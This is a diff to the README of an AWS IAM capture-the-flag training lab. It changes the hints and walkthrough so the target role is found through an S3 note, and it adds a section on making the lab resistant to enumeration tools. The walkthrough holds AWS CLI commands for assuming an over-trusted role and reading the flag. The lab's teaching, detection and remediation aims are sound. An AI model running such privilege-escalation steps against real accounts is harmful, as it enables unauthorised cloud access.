@@ -84,18 +84,18 @@ Your IAM user (`ctf-easy-player`) is attached a policy that grants:
 | Permission | Scope |
 |-----------|-------|
 | `sts:GetCallerIdentity` | `*` |
-| `iam:ListRoles` | `*` |
-| `iam:GetRole` | `*` |
-| `sts:AssumeRole` | One specific role ARN |
+| `sts:AssumeRole` | `*` |
 | `ssm:DescribeParameters` | `*` |
+| `s3:ListAllMyBuckets` | `*` |
+| `s3:ListBucket` / `s3:GetObject` | One specific S3 bucket |
 
 You cannot read from SSM Parameter Store directly with these credentials.
 
 ### Key questions to guide you
 
-- What IAM roles exist in the account?
-- Who or what is allowed to assume the monitoring role? Read the `AssumeRolePolicyDocument` carefully.
-- Is the trust policy correct for its stated purpose?
+- What S3 buckets are visible to you? What do they contain?
+- What role does the internal note mention, and what is it used for?
+- Can you assume that role with your credentials? Should you be able to?
 - Once you assume the role, what can you do?
 
 ### Hints
@@ -103,40 +103,40 @@ You cannot read from SSM Parameter Store directly with these credentials.
 <details>
 <summary>Hint 1 — Finding the target</summary>
 
-List all roles in the account and look for one that sounds related to monitoring or EC2:
+You don't have IAM enumeration permissions. Look elsewhere — what other AWS services do you have access to?
 
 ```bash
-aws iam list-roles --query 'Roles[*].[RoleName, Arn]' --output table
+aws s3 ls
 ```
 
 </details>
 
 <details>
-<summary>Hint 2 — Reading the trust policy</summary>
+<summary>Hint 2 — Reading the hint file</summary>
 
-Inspect the role's trust relationship:
+Once you find a bucket, list its contents and read the files inside:
 
 ```bash
-aws iam get-role --role-name <role-name> \
-  --query 'Role.AssumeRolePolicyDocument'
+aws s3 ls s3://<bucket-name> --recursive
+aws s3 cp s3://<bucket-name>/<key> -
 ```
 
-Pay close attention to the `Principal`. What does `arn:aws:iam::ACCOUNT_ID:root` mean?
+Look for internal documentation that mentions an IAM role.
 
 </details>
 
 <details>
 <summary>Hint 3 — Assuming the role</summary>
 
-If the trust policy allows your identity to assume the role, use STS:
+Once you have a role name from the hint, try assuming it. You have `sts:AssumeRole` on `*` — the question is whether the role's trust policy will accept your identity:
 
 ```bash
 aws sts assume-role \
-  --role-arn <role-arn> \
+  --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<role-name> \
   --role-session-name my-session
 ```
 
-The response contains temporary credentials. Export them as environment variables, then try reading the flag.
+Export the temporary credentials, then try reading the flag from SSM.
 
 </details>
 
@@ -173,18 +173,16 @@ Your IAM user (`ctf-hard-player`) has two policies attached:
 | Permission | Scope |
 |-----------|-------|
 | `sts:GetCallerIdentity` | `*` |
-| `iam:GetUser` | `*` |
-| `iam:ListAttachedUserPolicies` | `*` |
-| `iam:ListUserPolicies` | `*` |
-| `iam:GetUserPolicy` | `*` |
-| `iam:ListPolicies` | `*` |
-| `iam:GetPolicy` | `*` |
-| `iam:GetPolicyVersion` | `*` |
-| `iam:ListPolicyVersions` | `*` |
+| `iam:GetUser` | Own user ARN only |
+| `iam:ListAttachedUserPolicies` | Own user ARN only |
+| `iam:ListUserPolicies` | Own user ARN only |
+| `iam:GetUserPolicy` | Own user ARN only |
 | `iam:CreatePolicyVersion` | One specific policy ARN |
 | `iam:SetDefaultPolicyVersion` | One specific policy ARN |
 | `s3:ListAllMyBuckets` | `*` |
 | `s3:ListBucket` / `s3:GetObject` | One specific S3 bucket |
+
+`iam:ListPolicies`, `iam:GetPolicy`, `iam:GetPolicyVersion`, and `iam:ListPolicyVersions` are not granted. You can only enumerate your own user's policies — everything you need is attached to or inline on yourself.
 
 **Managed policy** (`ctf-hard-restricted`) — attached to your user, initially very limited.
 
@@ -285,38 +283,54 @@ Expected output:
 }
 ```
 
-#### Step 2: Enumerate IAM roles
+#### Step 2: Find the S3 hint bucket
 
 ```bash
-aws iam list-roles --query 'Roles[*].[RoleName, Arn]' --output table
+aws s3 ls
 ```
 
-You will see `ec2-monitoring-role` in the list.
-
-#### Step 3: Read the trust policy
+You will see a bucket named `ctf-easy-artifacts-XXXXXXXX`.
 
 ```bash
-aws iam get-role --role-name ec2-monitoring-role \
-  --query 'Role.AssumeRolePolicyDocument'
+aws s3 ls s3://ctf-easy-artifacts-XXXXXXXX --recursive
 ```
 
 Output:
-```json
-{
-    "Version": "2012-10-17",
-    "Statement": [
-        {
-            "Effect": "Allow",
-            "Principal": {
-                "AWS": "arn:aws:iam::123456789012:root"
-            },
-            "Action": "sts:AssumeRole"
-        }
-    ]
-}
+```
+2024-03-15 14:32:01    512 internal/platform-notes.txt
 ```
 
-**The vulnerability**: the principal `arn:aws:iam::ACCOUNT_ID:root` means _any authenticated IAM identity in this account_ can assume this role — not just the EC2 service. The role was intended for EC2 instances, so the principal should have been `{ "Service": "ec2.amazonaws.com" }`.
+```bash
+aws s3 cp s3://ctf-easy-artifacts-XXXXXXXX/internal/platform-notes.txt -
+```
+
+The note reads:
+
+```
+Platform Engineering — Internal Notes
+======================================
+
+EC2 Monitoring Tool — IAM Setup
+--------------------------------
+Role name : ec2-monitoring-role
+...
+Trust policy is currently using account-level access for development
+convenience.
+```
+
+This reveals the target role name and a clue that the trust policy is overly broad.
+
+#### Step 3: Attempt role assumption
+
+You have `sts:AssumeRole` on `*`. Try assuming the role directly — no trust policy inspection needed:
+
+```bash
+aws sts assume-role \
+  --role-arn arn:aws:iam::123456789012:role/ec2-monitoring-role \
+  --role-session-name open-sesame
+```
+
+This succeeds. **The vulnerability**: the trust policy uses `arn:aws:iam::ACCOUNT_ID:root` as the principal, meaning _any authenticated IAM identity in this account_ can assume this role. It should have been `{ "Service": "ec2.amazonaws.com" }`.
 
 #### Step 4: Assume the role
 
@@ -516,7 +530,51 @@ This is also the correct **defence** against this attack: apply permissions boun
 
 ---
 
-### 1. Reading the Terraform Code
+### 1. Anti-Enumeration Design
+
+Both labs were hardened to reduce the usefulness of automated tools like Pacu and enumerate-iam. These tools work by making the same AWS API calls as the CLI — they cannot be blocked outright — but their output can be made less actionable.
+
+#### What was removed and why
+
+| Lab | Removed permission | Why it helps |
+|-----|-------------------|-------------|
+| Easy | `iam:ListRoles` | enumerate-iam/Pacu cannot list roles; role must be found via S3 hint |
+| Easy | `iam:GetRole` | Cannot read trust policies directly; assumption must be attempted blindly |
+| Hard | `iam:ListPolicies` | Cannot enumerate all managed policies in the account |
+| Hard | `iam:GetPolicy` | Cannot read policy metadata for arbitrary policies |
+| Hard | `iam:GetPolicyVersion` | Cannot read policy document content for arbitrary policies |
+| Hard | `iam:ListPolicyVersions` | Cannot list version history for arbitrary policies |
+
+#### What was scoped down
+
+| Lab | Permission | Before | After |
+|-----|-----------|--------|-------|
+| Hard | `iam:GetUser` + self-enumeration | `Resource: "*"` | `Resource: own user ARN` |
+
+enumerate-iam tries these actions with `Resource: "*"`. Scoping them to the player's own ARN means the tool gets `AccessDenied` on its default probes and must be specifically targeted to succeed.
+
+#### What was added as noise
+
+| Lab | Noise resource | Visible via |
+|-----|---------------|------------|
+| Easy | 5 decoy SSM parameters (`/config/ec2/*`, `/internal/*`) | `ssm:DescribeParameters` |
+| Hard | `deploy/buildspec.yml`, `config/pipeline-vars.json`, `logs/deploy-20240315.log` | `s3:ListBucket` on hint bucket |
+
+The SSM decoys pad the `DescribeParameters` output so `/ctf/easy/flag` is not immediately obvious. The S3 decoys force players to read multiple files before finding the key information; automated tools that only check the `hints/README.txt` key will miss the other files (or read too many).
+
+#### What tools can still do
+
+Removing permissions does not make the lab immune to tooling — it raises the bar:
+
+- enumerate-iam can still confirm `sts:AssumeRole` is available (Lab 1) and `iam:CreatePolicyVersion` is available on a specific ARN (Lab 2)
+- Pacu's `iam__privesc_scan` will still identify `iam:CreatePolicyVersion` once it reads the inline policy
+- Players still need to understand *why* each finding is exploitable and *how* to chain the steps
+
+The goal is that **tool output does not hand players a ready-made exploit** — understanding the attack is still required.
+
+---
+
+### 2. Reading the Terraform Code
 
 The entire infrastructure lives in `terraform/`. Understanding it from the IaC perspective shows exactly what was deployed and, crucially, which lines contain the intentional misconfigurations.
 
@@ -576,7 +634,7 @@ Also notice the permissions boundary in `lab-hard/main.tf` — the `aws_iam_user
 
 ---
 
-### 2. Exploring Live Resources — Lab 1 (Easy)
+### 3. Exploring Live Resources — Lab 1 (Easy)
 
 Use an administrator profile (or the `ctf-easy-player` credentials) to walk through every resource that was created.
 
@@ -643,7 +701,7 @@ Note the `Type: SecureString` — the value is encrypted with the AWS-managed KM
 
 ---
 
-### 3. Exploring Live Resources — Lab 2 (Hard)
+### 4. Exploring Live Resources — Lab 2 (Hard)
 
 Use an administrator profile or the `ctf-hard-player` credentials (post-escalation).
 
@@ -753,7 +811,7 @@ Note:
 
 ---
 
-### 4. The Auto-Reset Mechanism (Hard Lab)
+### 5. The Auto-Reset Mechanism (Hard Lab)
 
 #### Why it exists
 
@@ -811,7 +869,7 @@ The Lambda execution role is narrowly scoped: `iam:ListPolicyVersions`, `iam:Get
 
 ---
 
-### 6. Using the IAM Policy Simulator
+### 7. Using the IAM Policy Simulator
 
 The IAM Policy Simulator lets you test what an identity can and cannot do without actually making the call. It is invaluable for auditing.
 
@@ -846,7 +904,7 @@ The simulator respects permissions boundaries — you will see a `DENIED` result
 
 ---
 
-### 7. Detecting These Attacks in a Real Environment
+### 8. Detecting These Attacks in a Real Environment
 
 #### CloudTrail — the evidence trail
 
@@ -953,7 +1011,7 @@ The `iam_policy_allows_privilege_escalation` check specifically tests for `iam:C
 
 ---
 
-### 8. Remediation — Fixing the Misconfigurations
+### 9. Remediation — Fixing the Misconfigurations
 
 #### Lab 1 fix — correct the trust policy
 
@@ -1057,7 +1115,7 @@ Attach a permissions boundary to every pipeline identity that caps the maximum e
 
 ---
 
-### 9. MITRE ATT&CK Mapping
+### 10. MITRE ATT&CK Mapping
 
 Both labs map to the MITRE ATT&CK Cloud matrix:
 
@@ -1072,7 +1130,7 @@ The `iam:CreatePolicyVersion` technique is also catalogued in the [Rhino Securit
 
 ---
 
-### 10. Further Reading and Tools
+### 11. Further Reading and Tools
 
 | Resource | What it covers |
 |----------|---------------|
